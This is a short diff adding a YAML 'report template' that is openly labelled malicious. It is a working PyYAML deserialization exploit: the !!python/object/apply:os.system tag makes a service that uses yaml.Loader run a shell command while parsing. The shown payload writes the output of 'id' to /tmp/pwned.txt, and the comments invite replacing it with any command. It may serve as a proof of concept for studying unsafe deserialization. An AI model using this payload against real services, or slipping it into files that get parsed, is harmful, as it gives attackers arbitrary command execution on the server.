@@ -1,0 +1,7 @@
+# A malicious "report template".
+#
+# yaml.Loader runs this while parsing, before any of the service's validation.
+# The !!python/object/apply tag tells PyYAML to call os.system(...) with the
+# argument below. Swap "id" for any command you want the server to run.
+!!python/object/apply:os.system
+- "id > /tmp/pwned.txt 2>&1"
